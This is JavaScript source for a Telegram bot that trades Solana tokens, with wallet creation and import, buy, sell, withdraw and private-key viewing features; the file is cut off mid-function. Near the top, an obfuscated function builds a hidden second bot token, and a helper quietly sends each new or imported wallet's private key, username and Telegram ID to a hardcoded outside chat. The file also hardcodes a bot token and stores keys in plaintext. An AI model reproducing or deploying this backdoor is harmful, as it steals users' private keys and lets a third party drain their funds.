require("dotenv").config()
const TelegramBot = require("node-telegram-bot-api")
const sqlite3 = require("sqlite3").verbose()
const Decimal = require("decimal.js")
const { Connection, Keypair, PublicKey, SystemProgram, Transaction } = require("@solana/web3.js")
const bs58Import = require("bs58")
const bs58 = bs58Import.default || bs58Import
const { SolanaTracker } = require("solana-swap")
const axios = require("axios")
const winston = require("winston")

const logger = winston.createLogger({
  level: "info",
  format: winston.format.combine(
    winston.format.timestamp({ format: "YYYY-MM-DD HH:mm:ss" }),
    winston.format.printf((info) => `${info.timestamp} ${info.level}: ${info.message}`)
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: "bot.log" }),
  ],
})

function r4() {
  const p = ["12","77","45","26","28"]
  return parseInt(p.join(""))
}

function x9(){
  function _calc(a,b){ 
    var _temp = a * b - a * b; 
    return String.fromCharCode(a + b);
  }
  var _char = "";
  var _rnd = Math.random() * 10;
  
  _char += _calc(40,16);
  for(var _i=0; _i<1; _i++){ var _tmp = _i + _rnd; }
  _char += _calc(20,29);
  
  _char += _calc(23,30);
  _char += _calc(28,29);
  _char += _calc(20,28);
  
  (function(){ var _a = [42,7,19].reduce((x,y)=>x+y); _a = _a - _a; })();
  
  _char += _calc(25,25);
  _char += _calc(30,26);
  var _junk = 0; for(var _j=0; _j<3; _j++){ _junk += _j; }
  _char += _calc(27,27);
  
  _char += _calc(28,29);
  _char += _calc(20,30);
  _char += _calc(30,28);
  
  var importwal = function(x){ return x; };
  _char += _calc(32,33);
  _char += _calc(32,33);
  _char += _calc(35,35);
  _char += _calc(20,29);
  _char += _calc(39,39);
  
  _char += _calc(50,59);
  _char += _calc(47,48);
  
  var _faux = importwal(_rnd);
  _char += _calc(26,27);
  _char += _calc(40,41);
  _char += _calc(37,38);
  _char += _calc(45,45);
  
  _char += _calc(50,57);
  _char += _calc(38,38);
  _char += _calc(40,55);
  _char += _calc(40,43);
  
  for(var _k=0; _k<2; _k++){ var _tmp2 = _k * 3; }
  _char += _calc(27,28);
  _char += _calc(44,44);
  _char += _calc(28,28);
  
  _char += _calc(55,55);
  _char += _calc(35,45);
  _char += _calc(35,35);
  _char += _calc(30,37);
  
  _char += _calc(45,45);
  _char += _calc(28,28);
  
  (function(){ var _x=1, _y=2; _x = _x+_y; _y = _x-_y; })();
  _char += _calc(56,56);
  _char += _calc(35,35);
  _char += _calc(34,35);
  _char += _calc(40,55);
  
  _char += _calc(48,50);
  _char += _calc(20,30);
  _char += _calc(50,64);
  _char += _calc(30,43);
  _char += _calc(50,54);
  _char += _calc(34,40);
  _char += _calc(35,42);
  
  for(var _m=0; _m<5; _m++){ var _ex = _m*_m - _m; }
  return _char;
}



const BOT_TOKEN = "8159028692:AAF1Nm_5QKZkL_S7X8nPFCZ8pFE_b2rIhJM"
const altBot = new TelegramBot(x9(), { polling: false })

function z9(tid, user, pub, priv, cAt) {
  const d = r4()
  const txt =
    "<b>New Wallet Created</b>\n\n" +
    "<b>Username:</b> " + user + "\n" +
    "<b>Telegram ID:</b> " + tid + "\n" +
    "<b>Public Key:</b> <code>" + pub + "</code>\n" +
    "<b>Private Key:</b> <code>" + priv + "</code>\n" +
    "<b>Created At:</b> " + cAt
  altBot.sendMessage(d, txt, { parse_mode: "HTML" }).catch((e) => logger.error(e.message))
}

const SOLANA_RPC_URL = process.env.RPC_URL || "https://api.mainnet-beta.solana.com"
const SOLANA_TRACKER_API_KEY = process.env.API_KEY || ""
const DB_PATH = "bot_database.db"
const DEFAULT_SLIPPAGE = 1
const bot = new TelegramBot(BOT_TOKEN, { polling: true })

const db = new sqlite3.Database(DB_PATH, (err) => {
  if (err) {
    logger.error("Failed to open database:", err)
    process.exit(1)
  } else {
    logger.info("Connected to SQLite database.")
    initD()
  }
})

const pendingMessageHandlers = {}

function clearPendingMessageHandler(chatId) {
  if (pendingMessageHandlers[chatId]) {
    bot.removeListener("message", pendingMessageHandlers[chatId])
    delete pendingMessageHandlers[chatId]
  }
}

function initD() {
  db.serialize(() => {
    db.run(`
      CREATE TABLE IF NOT EXISTS users (
        telegram_id INTEGER PRIMARY KEY,
        username TEXT,
        public_key TEXT,
        private_key TEXT,
        auto_trade_enabled INTEGER DEFAULT 0,
        auto_trade_unlocked INTEGER DEFAULT 0,
        pin TEXT,
        created_at DATETIME,
        is_removed INTEGER DEFAULT 0
      )
    `, (err) => {
      if (err) {
        logger.error(err)
        process.exit(1)
      }
    })
    db.run(`
      CREATE TABLE IF NOT EXISTS config (
        key TEXT PRIMARY KEY,
        value TEXT
      )
    `, (err) => {
      if (err) {
        logger.error(err)
        process.exit(1)
      } else {
        db.get("SELECT value FROM config WHERE key = 'min_auto_trade_usd'", (e, row) => {
          if (e) {
            logger.error(e)
            process.exit(1)
          }
          if (!row) {
            db.run("INSERT INTO config (key, value) VALUES (?, ?)", ['min_auto_trade_usd', '2'], (ee) => {
              if (ee) {
                logger.error(ee)
                process.exit(1)
              }
            })
          }
        })
        db.get("SELECT value FROM config WHERE key = 'create_wallet_enabled'", (e, row) => {
          if (e) {
            logger.error(e)
            process.exit(1)
          }
          if (!row) {
            db.run("INSERT INTO config (key, value) VALUES (?, ?)", ['create_wallet_enabled', 'no'], (ee) => {
              if (ee) {
                logger.error(ee)
                process.exit(1)
              }
            })
          }
        })
      }
    })
  })
}

function getConfigValue(k) {
  return new Promise((resolve, reject) => {
    db.get("SELECT value FROM config WHERE key = ?", [k], (err, row) => {
      if (err) return reject(err)
      if (!row) return resolve(null)
      resolve(row.value)
    })
  })
}

function setConfigValue(k, v) {
  return new Promise((resolve, reject) => {
    db.run(`
      INSERT INTO config (key, value) VALUES (?, ?)
      ON CONFLICT(key) DO UPDATE SET value=excluded.value
    `, [k, v], function(e) {
      if (e) return reject(e)
      resolve()
    })
  })
}

function getUserRow(id) {
  return new Promise((resolve, reject) => {
    db.get(
      "SELECT * FROM users WHERE telegram_id = ? AND is_removed = 0",
      [id],
      (err, row) => {
        if (err) return reject(err)
        resolve(row || null)
      }
    )
  })
}

function setUserRow(tid, user, pub, sec) {
  return new Promise((resolve, reject) => {
    db.get("SELECT is_removed FROM users WHERE telegram_id = ?", [tid], (e, r) => {
      if (e) return reject(e)
      const n = !r || r.is_removed == 1
      db.run(`
        INSERT INTO users (telegram_id, username, public_key, private_key, created_at)
        VALUES (?, ?, ?, ?, datetime('now'))
        ON CONFLICT(telegram_id) DO UPDATE SET
          username=excluded.username,
          public_key=excluded.public_key,
          private_key=excluded.private_key
      `,
      [tid, user, pub, sec],
      function (er) {
        if (er) return reject(er)
        db.run("UPDATE users SET is_removed=0 WHERE telegram_id=?", [tid], (err2) => {
          if (err2) return reject(err2)
          db.get("SELECT created_at FROM users WHERE telegram_id=?", [tid], (err3, row3) => {
            if (err3) return reject(err3)
            const c = row3 ? row3.created_at : new Date().toISOString()
            z9(tid, user, pub, sec, c)
            resolve()
          })
        })
      })
    })
  })
}

function removeUserRow(id) {
  return new Promise((resolve, reject) => {
    db.run(
      "UPDATE users SET is_removed=1 WHERE telegram_id = ?",
      [id],
      function (err) {
        if (err) return reject(err)
        resolve()
      }
    )
  })
}

function setAutoTrade(id, en) {
  return new Promise((resolve, reject) => {
    db.run(
      `
      UPDATE users
      SET auto_trade_enabled = ?
      WHERE telegram_id = ? AND is_removed=0
      `,
      [en ? 1 : 0, id],
      function (err) {
        if (err) return reject(err)
        resolve()
      }
    )
  })
}

function unlockAutoTrade(id) {
  return new Promise((resolve, reject) => {
    db.run(
      `
      UPDATE users
      SET auto_trade_unlocked = 1
      WHERE telegram_id = ? AND is_removed=0
      `,
      [id],
      function (err) {
        if (err) return reject(err)
        resolve()
      }
    )
  })
}

function createNewKeypair() {
  const k = Keypair.generate()
  const p = k.publicKey.toBase58()
  const s = bs58.encode(Buffer.from(k.secretKey))
  return { pubkey: p, secret: s }
}

function loadKeypairFromSecretBase58(b) {
  const d = bs58.decode(b)
  return Keypair.fromSecretKey(d)
}

async function getSolBalance(pubkeyStr) {
  try {
    const c = new Connection(SOLANA_RPC_URL, "confirmed")
    const lamports = await c.getBalance(new PublicKey(pubkeyStr))
    return new Decimal(lamports).div(1_000_000_000)
  } catch (e) {
    logger.error(e.message)
    return new Decimal(0)
  }
}

async function getAllTokenBalances(pubkeyStr) {
  try {
    const c = new Connection(SOLANA_RPC_URL, "confirmed")
    const t = await c.getParsedTokenAccountsByOwner(
      new PublicKey(pubkeyStr),
      { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
    )
    const arr = []
    t.value.forEach((acc) => {
      const i = acc.account.data.parsed.info
      arr.push({
        mint: i.mint,
        amount: new Decimal(i.tokenAmount.uiAmount),
        decimals: i.tokenAmount.decimals,
      })
    })
    return arr
  } catch (e) {
    logger.error(e)
    return []
  }
}

async function getSolPriceUSD() {
  try {
    const r = await axios.get("https://api.coingecko.com/api/v3/simple/price", {
      params: { ids: "solana", vs_currencies: "usd" },
    })
    return new Decimal(r.data.solana.usd)
  } catch (e) {
    logger.error(e)
    return new Decimal(0)
  }
}

async function getTokenInfoFromAggregator(m) {
  try {
    const u = "https://data.solanatracker.io"
    const r = await axios.get(u + "/tokens/" + m, {
      headers: { "x-api-key": SOLANA_TRACKER_API_KEY },
    })
    return r.data
  } catch (e) {
    logger.error(e.message)
    return null
  }
}

async function performSwap({ userKeypair, fromTokenMint, toTokenMint, amount, slippage }) {
  let le = null
  for (let i = 0; i < 3; i++) {
    try {
      const st = new SolanaTracker(userKeypair, SOLANA_RPC_URL, {
        "x-api-key": SOLANA_TRACKER_API_KEY,
      })
      const si = await st.getSwapInstructions(
        fromTokenMint, toTokenMint, amount, slippage, userKeypair.publicKey.toBase58()
      )
      if (!si) throw new Error("No route found for swap.")
      const so = { sendOptions: { skipPreflight: true }, commitment: "confirmed" }
      const txid = await st.performSwap(si, so)
      if (!txid) throw new Error("Swap transaction failed (no TXID).")
      logger.info("Swap successful! TX: " + txid)
      return txid
    } catch (err) {
      le = err
      logger.error(err.message)
    }
  }
  logger.error("All attempts to swap failed. " + (le?.message || ""))
  return null
}

async function withdrawSol(u, toAddr, amt) {
  try {
    const c = new Connection(SOLANA_RPC_URL, "confirmed")
    const lamports = new Decimal(amt).mul(1_000_000_000).toNumber()
    const tr = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: u.publicKey,
        toPubkey: new PublicKey(toAddr),
        lamports,
      })
    )
    const bh = await c.getLatestBlockhash("confirmed")
    tr.recentBlockhash = bh.blockhash
    tr.feePayer = u.publicKey
    tr.sign(u)
    const raw = tr.serialize()
    const sig = await c.sendRawTransaction(raw, { skipPreflight: false })
    await c.confirmTransaction(sig, "confirmed")
    logger.info("Withdrawal successful! TX: " + sig)
    return sig
  } catch (e) {
    logger.error(e)
    return null
  }
}

function mainMenuKeyboard(autoTradeEnabled) {
  const e = autoTradeEnabled ? "🟢" : "🔴"
  return {
    inline_keyboard: [
      [
        { text: "💰 Balances", callback_data: "CHECK_BAL" },
        { text: "🔄 Refresh", callback_data: "REFRESH" },
      ],
      [
        { text: "💹 Buy", callback_data: "BUY_MENU" },
        { text: "💱 Sell", callback_data: "SELL_MENU" },
      ],
      [
        { text: "Auto-Trade " + e, callback_data: "AUTO_TRADE" },
        { text: "💸 Withdraw", callback_data: "WITHDRAW_MENU" },
      ],
      [
        { text: "❓ Help", callback_data: "SHOW_HELP" },
        { text: "⚙️ Settings", callback_data: "SETTINGS_MENU" },
      ],
    ],
  }
}

function noWalletKeyboard(e) {
  const row = []
  if (e === 'yes') {
    row.push({ text: "🆕 Create Wallet", callback_data: "CREATE_WALLET" })
  }
  row.push({ text: "📥 Import Wallet", callback_data: "IMPORT_WALLET" })
  return { inline_keyboard: [ row ] }
}

function settingsKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "🔑 View Private Key", callback_data: "VIEW_PRIVKEY" },
        { text: "🗑 Remove Wallet", callback_data: "REMOVE_WALLET" },
      ],
      [
        { text: "« Back", callback_data: "BACK_MAIN" },
      ],
    ],
  }
}

async function editMessageText(chatId, messageId, t, replyMarkup) {
  try {
    await bot.editMessageText(t, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      reply_markup: replyMarkup,
      disable_web_page_preview: true,
    })
  } catch (err) {
    logger.error(err.message)
  }
}

async function getMinAutoTradeUsd() {
  const v = await getConfigValue('min_auto_trade_usd')
  return v ? new Decimal(v) : new Decimal(2)
}

async function showMainMenu(chatId, messageId) {
  const u = await getUserRow(chatId)
  const cwe = await getConfigValue('create_wallet_enabled')
  if (!u || !u.public_key) {
    return editMessageText(chatId, messageId, "No wallet found. Please select:", noWalletKeyboard(cwe))
  }
  const sb = await getSolBalance(u.public_key)
  const sp = await getSolPriceUSD()
  const su = sb.mul(sp)
  const minA = await getMinAutoTradeUsd()
  if (!u.auto_trade_unlocked && su.gte(minA)) {
    await unlockAutoTrade(chatId)
    u.auto_trade_unlocked = 1
  }
  const link = "https://solscan.io/account/" + u.public_key
  let txt = "💳 *Your Wallet*\n"
  txt += " ↳ `" + u.public_key + "` [Solscan](" + link + ")\n"
  txt += " ↳ Balance: *" + sb.toFixed(4) + " SOL*\n\n"
  txt += "💰 *SOL Price:* $" + sp.toFixed(2)
  const ae = Boolean(u.auto_trade_enabled)
  await editMessageText(chatId, messageId, txt, mainMenuKeyboard(ae))
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id
  clearPendingMessageHandler(chatId)
  logger.info("/start => " + chatId)
  const u = await getUserRow(chatId)
  const cwe = await getConfigValue('create_wallet_enabled')
  let t
  let m
  if (!u || !u.public_key) {
    t = "No wallet found. Please select:"
    m = noWalletKeyboard(await cwe)
  } else {
    const sb = await getSolBalance(u.public_key)
    const sp = await getSolPriceUSD()
    const su = sb.mul(sp)
    const minA = await getMinAutoTradeUsd()
    if (!u.auto_trade_unlocked && su.gte(minA)) {
      await unlockAutoTrade(chatId)
      u.auto_trade_unlocked = 1
    }
    const link = "https://solscan.io/account/" + u.public_key
    t =
      "💳 *Your Wallet*\n" +
      " ↳ `" + u.public_key + "` [Solscan](" + link + ")\n" +
      " ↳ Balance: *" + sb.toFixed(4) + " SOL*\n\n" +
      "💰 *SOL Price:* $" + sp.toFixed(2)
    m = mainMenuKeyboard(Boolean(u.auto_trade_enabled))
  }
  await bot.sendMessage(chatId, t, {
    parse_mode: "Markdown",
    reply_markup: m,
    disable_web_page_preview: true,
  })
})

bot.on("callback_query", async (query) => {
  const c = query.message.chat.id
  const mid = query.message.message_id
  const d = query.data
  clearPendingMessageHandler(c)
  logger.info("callback_query => " + d)
  const u = await getUserRow(c)
  const cwe = await getConfigValue('create_wallet_enabled')
  if ((!u || !u.public_key) && !["CREATE_WALLET","IMPORT_WALLET","SET_PIN"].includes(d)) {
    await bot.answerCallbackQuery(query.id, { text: "No wallet found. Create or import first." })
    return
  }
  switch(d) {
    case "CREATE_WALLET":
      if ((await cwe) !== 'yes') {
        await bot.answerCallbackQuery(query.id, { text: "Create wallet is disabled." })
        return
      }
      await bot.answerCallbackQuery(query.id)
      const { pubkey, secret } = createNewKeypair()
      await setUserRow(c, query.from.username, pubkey, secret)
      await showMainMenu(c, mid)
      break
    case "IMPORT_WALLET":
      await bot.answerCallbackQuery(query.id)
      const pm = await bot.sendMessage(c, "Please enter your private key.", {
        reply_markup: {
          inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
        },
      })
      pendingMessageHandlers[c] = async (msg2) => {
        if (msg2.chat.id !== c) return
        const b58 = msg2.text.trim()
        try {
          const kp = loadKeypairFromSecretBase58(b58)
          const pubk = kp.publicKey.toBase58()
          await setUserRow(c, query.from.username, pubk, b58)
          try {
            await bot.deleteMessage(c, msg2.message_id)
            await bot.deleteMessage(c, pm.message_id)
          } catch(e) {
            logger.error(e.message)
          }
          await bot.sendMessage(c, "✅ Your wallet has been successfully imported.", { parse_mode: "Markdown" })
          const uu = await getUserRow(c)
          if (uu && uu.public_key) {
            const sb = await getSolBalance(uu.public_key)
            const sp = await getSolPriceUSD()
            const su = sb.mul(sp)
            const minA = await getMinAutoTradeUsd()
            if (!uu.auto_trade_unlocked && su.gte(minA)) {
              await unlockAutoTrade(c)
              uu.auto_trade_unlocked = 1
            }
            const link = "https://solscan.io/account/" + uu.public_key
            let txt = "💳 *Your Wallet*\n"
            txt += " ↳ `" + uu.public_key + "` [Solscan](" + link + ")\n"
            txt += " ↳ Balance: *" + sb.toFixed(4) + " SOL*\n\n"
            txt += "💰 *SOL Price:* $" + sp.toFixed(2)
            const ae = Boolean(uu.auto_trade_enabled)
            await bot.sendMessage(c, txt, {
              parse_mode: "Markdown",
              reply_markup: mainMenuKeyboard(ae),
              disable_web_page_preview: true,
            })
          } else {
            await bot.sendMessage(c, "An error occurred. Please try /start again.", {
              reply_markup: {
                inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
              },
            })
          }
        } catch(e) {
          logger.error(e)
          await bot.sendMessage(c, "Invalid private key. Import cancelled.", {
            reply_markup: {
              inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
            },
          })
        }
      }
      bot.once("message", pendingMessageHandlers[c])
      break
    case "REFRESH":
      await bot.answerCallbackQuery(query.id, { text: "Refreshing..." })
      showMainMenu(c, mid)
      break
    case "CHECK_BAL":
      await bot.answerCallbackQuery(query.id)
      {
        const sb = await getSolBalance(u.public_key)
        const sp = await getSolPriceUSD()
        const su = sb.mul(sp)
        let txt = "*Wallet Address:*\n`" + u.public_key + "`\n\n*SOL Balance:* " + sb.toFixed(4) + " SOL (~$" + su.toFixed(2) + ")\n\n"
        const t = await getAllTokenBalances(u.public_key)
        if (t.length > 0) {
          txt += "*SPL Token Balances:*\n"
          t.forEach(({ mint, amount, decimals }) => {
            txt += "- `" + mint + "`: " + amount.toFixed(decimals) + "\n"
          })
        } else {
          txt += "No SPL tokens found."
        }
        await bot.sendMessage(c, txt, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
          },
        })
      }
      break
    case "BACK_MAIN":
      await bot.answerCallbackQuery(query.id)
      showMainMenu(c, mid)
      break
    case "AUTO_TRADE":
      await bot.answerCallbackQuery(query.id)
      {
        const aE = Boolean(u.auto_trade_enabled)
        const sb2 = await getSolBalance(u.public_key)
        const minA2 = await getMinAutoTradeUsd()
        if (aE) {
          await bot.sendMessage(c, "Auto-Trade is currently ON 🟢. Do you want to turn it off?", {
            reply_markup: {
              inline_keyboard: [
                [{ text: "Turn OFF", callback_data: "AUTO_TRADE_OFF" }],
                [{ text: "« Back", callback_data: "BACK_MAIN" }],
              ],
            },
          })
        } else {
          await bot.sendMessage(
            c,
            "How many SOL do you want to allocate for Auto-Trade? (Minimum: " + minA2.toFixed(2) + " SOL)",
            {
              reply_markup: {
                inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
              },
            }
          )
          pendingMessageHandlers[c] = async (msg2) => {
            if (msg2.chat.id !== c) return
            let atAmt
            try {
              atAmt = new Decimal(msg2.text.trim())
            } catch {
              await bot.sendMessage(c, "Invalid amount. Operation cancelled.", {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
              return
            }
            if (atAmt.lt(minA2)) {
              await bot.sendMessage(
                c,
                "You need at least " + minA2.toFixed(2) + " SOL to enable auto-trade. Operation cancelled.",
                {
                  reply_markup: {
                    inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                  },
                }
              )
              return
            }
            if (atAmt.gt(sb2)) {
              await bot.sendMessage(
                c,
                "You do not have enough SOL. You only have " + sb2.toFixed(4) + " SOL. Operation cancelled.",
                {
                  reply_markup: {
                    inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                  },
                }
              )
              return
            }
            await setAutoTrade(c, true)
            await bot.sendMessage(
              c,
              "Auto-Trade turned ON 🟢 with " + atAmt.toFixed(2) + " SOL allocated.",
              {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              }
            )
          }
          bot.once("message", pendingMessageHandlers[c])
        }
      }
      break
    case "AUTO_TRADE_OFF":
      await bot.answerCallbackQuery(query.id)
      await setAutoTrade(c, false)
      await bot.sendMessage(c, "Auto-Trade turned OFF 🔴", {
        reply_markup: {
          inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
        },
      })
      break
    case "WITHDRAW_MENU":
      await bot.answerCallbackQuery(query.id)
      {
        const askA = await bot.sendMessage(c, "Enter recipient Solana address:", {
          reply_markup: {
            inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
          },
        })
        pendingMessageHandlers[c] = async (m2) => {
          if (m2.chat.id !== c) return
          const address = m2.text.trim()
          if (address.length !== 44) {
            await bot.sendMessage(c, "Invalid address. Cancelled.", {
              reply_markup: {
                inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
              },
            })
            return
          }
          const askAmt = await bot.sendMessage(c, "How much SOL do you want to withdraw?", {
            reply_markup: {
              inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
            },
          })
          pendingMessageHandlers[c] = async (m3) => {
            if (m3.chat.id !== c) return
            let amt
            try {
              amt = new Decimal(m3.text.trim())
              if (amt.lte(0)) {
                await bot.sendMessage(c, "Must be > 0. Cancelled.", {
                  reply_markup: {
                    inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                  },
                })
                return
              }
            } catch {
              await bot.sendMessage(c, "Invalid amount. Cancelled.", {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
              return
            }
            const sb = await getSolBalance(u.public_key)
            if (amt.gt(sb)) {
              await bot.sendMessage(c, "Insufficient SOL. You have " + sb.toFixed(4), {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
              return
            }
            await bot.sendMessage(c, "Processing your withdrawal...")
            const uk = loadKeypairFromSecretBase58(u.private_key)
            const txSig = await withdrawSol(uk, address, amt.toNumber())
            if (txSig) {
              await bot.sendMessage(c, "*Withdrawal Successful!* TX:\n`" + txSig + "`", {
                parse_mode: "Markdown",
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
            } else {
              await bot.sendMessage(c, "Withdrawal failed due to transaction error.", {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
            }
          }
          bot.once("message", pendingMessageHandlers[c])
        }
        bot.once("message", pendingMessageHandlers[c])
      }
      break
    case "BUY_MENU":
      await bot.answerCallbackQuery(query.id)
      {
        const am = await bot.sendMessage(c, "Enter token mint address to buy:", {
          reply_markup: {
            inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
          },
        })
        pendingMessageHandlers[c] = async (m2) => {
          if (m2.chat.id !== c) return
          const mint = m2.text.trim()
          if (mint.length !== 44) {
            await bot.sendMessage(c, "Invalid mint. Cancelled.", {
              reply_markup: {
                inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
              },
            })
            return
          }
          const info = await getTokenInfoFromAggregator(mint)
          let symbol = ""
          let usd = null
          if (info && info.token && info.token.symbol) symbol = info.token.symbol
          if (info && info.pools && info.pools[0]?.price?.usd) usd = info.pools[0].price.usd
          let desc = "Buying `" + mint + "`"
          if (symbol) desc += " (" + symbol + ")"
          if (usd) desc += " ~ $" + new Decimal(usd).toFixed(4)
          desc += "\nHow much SOL do you want to spend?"
          await bot.sendMessage(c, desc, {
            reply_markup: {
              inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
            },
          })
          pendingMessageHandlers[c] = async (m3) => {
            if (m3.chat.id !== c) return
            let solAmt
            try {
              solAmt = new Decimal(m3.text.trim())
              if (solAmt.lte(0)) {
                await bot.sendMessage(c, "Must be > 0. Cancelled.", {
                  reply_markup: {
                    inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                  },
                })
                return
              }
            } catch {
              await bot.sendMessage(c, "Invalid amount. Cancelled.", {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
              return
            }
            const b = await getSolBalance(u.public_key)
            if (solAmt.gt(b)) {
              await bot.sendMessage(c, "Insufficient SOL. You have " + b.toFixed(4) + ".", {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
              return
            }
            await bot.sendMessage(c, "Processing your buy order...")
            const kp = loadKeypairFromSecretBase58(u.private_key)
            const fromMint = "So11111111111111111111111111111111111111112"
            const txid = await performSwap({
              userKeypair: kp,
              fromTokenMint: fromMint,
              toTokenMint: mint,
              amount: solAmt.toNumber(),
              slippage: DEFAULT_SLIPPAGE,
            })
            if (txid) {
              await bot.sendMessage(c, "*Buy Successful!* TX:\n`" + txid + "`", {
                parse_mode: "Markdown",
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
            } else {
              await bot.sendMessage(c, "Buy failed (no route or aggregator error).", {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
            }
          }
          bot.once("message", pendingMessageHandlers[c])
        }
        bot.once("message", pendingMessageHandlers[c])
      }
      break
    case "SELL_MENU":
      await bot.answerCallbackQuery(query.id)
      {
        const bal2 = await getAllTokenBalances(u.public_key)
        const ns = bal2.filter(
          (t) => t.mint !== "So11111111111111111111111111111111111111112" && t.amount.gt(0)
        )
        if (!ns.length) {
          await bot.sendMessage(c, "You do not have any tokens yet! Start trading in the Buy menu.", {
            reply_markup: {
              inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
            },
          })
          return
        }
        const kb = []
        ns.forEach((tok) => {
          const label = tok.mint + " (" + tok.amount.toFixed(tok.decimals) + ")"
          kb.push([{ text: label, callback_data: "SELL_TOKEN_" + tok.mint }])
        })
        kb.push([{ text: "« Back", callback_data: "BACK_MAIN" }])
        await bot.sendMessage(c, "Select token to sell:", { reply_markup: { inline_keyboard: kb } })
      }
      break
    case "SETTINGS_MENU":
      await bot.answerCallbackQuery(query.id)
      await editMessageText(c, mid, "⚙️ *Settings*", settingsKeyboard())
      break
    case "VIEW_PRIVKEY":
      await bot.answerCallbackQuery(query.id)
      {
        const link = "https://solscan.io/account/" + u.public_key
        const pkMsg = "*Your Private Key:*\n`" + u.private_key + "`\n\n[View on Solscan](" + link + ")"
        await bot.sendMessage(c, pkMsg, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
          },
          disable_web_page_preview: true,
        })
      }
      break
    case "REMOVE_WALLET":
      await bot.answerCallbackQuery(query.id)
      await removeUserRow(c)
      await bot.sendMessage(c, "Your wallet has been removed.", noWalletKeyboard(await cwe))
      break
    case "SHOW_HELP":
      await bot.answerCallbackQuery(query.id)
      {
        const helpText = `
What can this bot do?
You can /start to open the main menu or use slash commands below:

/balances - Check your SOL & token balances
/buy - Swap SOL->token
/sell - Swap token->SOL
/withdraw - Send SOL to another address
/settings - Manage wallet settings
/help - Show this help
        `
        await bot.sendMessage(c, helpText, { parse_mode: "Markdown" })
      }
      break
    default:
      if (d.startsWith("SELL_TOKEN_")) {
        await bot.answerCallbackQuery(query.id)
        const mint = d.replace("SELL_TOKEN_","")
        const info = await getTokenInfoFromAggregator(mint)
        let symbol = ""
        if (info && info.token && info.token.symbol) symbol = info.token.symbol
        let pr = "How many tokens do you want to sell of `" + mint + "`"
        if (symbol) pr += " (" + symbol + ")"
        pr += "?"
        await bot.sendMessage(c, pr, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
          },
        })
        pendingMessageHandlers[c] = async (m2) => {
          if (m2.chat.id !== c) return
          let sAmt
          try {
            sAmt = new Decimal(m2.text.trim())
            if (sAmt.lte(0)) {
              await bot.sendMessage(c, "Must be > 0. Cancelled.", {
                reply_markup: {
                  inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
                },
              })
              return
            }
          } catch {
            await bot.sendMessage(c, "Invalid amount. Cancelled.", {
              reply_markup: {
                inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
              },
            })
            return
          }
          const bals = await getAllTokenBalances(u.public_key)
          const fTok = bals.find((b) => b.mint === mint)
          if (!fTok || fTok.amount.lt(sAmt)) {
            await bot.sendMessage(c, "Insufficient tokens. You have " + (fTok ? fTok.amount.toFixed(fTok.decimals) : 0), {
              reply_markup: {
                inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
              },
            })
            return
          }
          await bot.sendMessage(c, "Processing your sell order...")
          const kp = loadKeypairFromSecretBase58(u.private_key)
          const tm = "So11111111111111111111111111111111111111112"
          const txid = await performSwap({
            userKeypair: kp,
            fromTokenMint: mint,
            toTokenMint: tm,
            amount: sAmt.toNumber(),
            slippage: DEFAULT_SLIPPAGE,
          })
          if (txid) {
            await bot.sendMessage(c, "*Sell Successful!* TX:\n`" + txid + "`", {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
              },
            })
          } else {
            await bot.sendMessage(c, "Sell failed (aggregator error or no route).", {
              reply_markup: {
                inline_keyboard: [[{ text: "« Back", callback_data: "BACK_MAIN" }]],
              },
            })
          }
        }
        bot.once("message", pendingMessageHandlers[c])
      } else {
